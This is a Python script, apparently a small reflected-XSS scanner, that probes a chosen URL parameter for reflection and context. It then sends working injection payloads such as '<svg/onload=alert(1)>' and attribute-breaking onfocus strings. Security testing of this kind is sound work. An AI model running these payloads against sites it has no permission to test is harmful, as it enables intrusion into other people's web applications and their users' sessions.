# XSS/xss.py
import requests
import argparse

MARKER = "XSS12345"

def send_request(session, url, param, value, method):
    if method == "GET":
        return session.get(url, params={param: value})
    elif method == "POST":
        return session.post(url, data={param: value})
    else:
        return None

def detect_context(response, marker):
    if f'"{marker}"' in response:
        return "attribute"
    elif f"'{marker}'" in response:
        return "attribute"
    elif f">{marker}<" in response:
        return "html"
    elif marker in response:
        return "unknown"
    return None

PAYLOADS = {
    "html": [
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>"
    ],
    "attribute": [
        '" onfocus=alert(1) autofocus="',
        "' onfocus=alert(1) autofocus='"
    ],
    "unknown": [
        "<svg/onload=alert(1)>"
    ]
}

def test_xss(url, param, method="GET"):
    s = requests.Session()
    method = method.upper()

    print(f"[*] Testing {param} for XSS using {method}")

    # Step 1: Reflection
    r = send_request(s, url, param, MARKER, method)

    if not r or MARKER not in r.text:
        print("[-] No reflection detected")
        return

    print("[+] Reflection detected")

    # Step 2: Context
    context = detect_context(r.text, MARKER)
    print(f"[+] Context detected: {context}")

    # Step 3: Payload testing
    payloads = PAYLOADS.get(context, PAYLOADS["unknown"])

    for payload in payloads:
        r = send_request(s, url, param, payload, method)

        if r and payload in r.text:
            print(f"[!!!] Possible XSS with payload: {payload}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Target URL")
    parser.add_argument("param", help="Parameter to test")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")

    args = parser.parse_args()
    test_xss(args.url, args.param, args.method)

if __name__ == "__main__":
    main()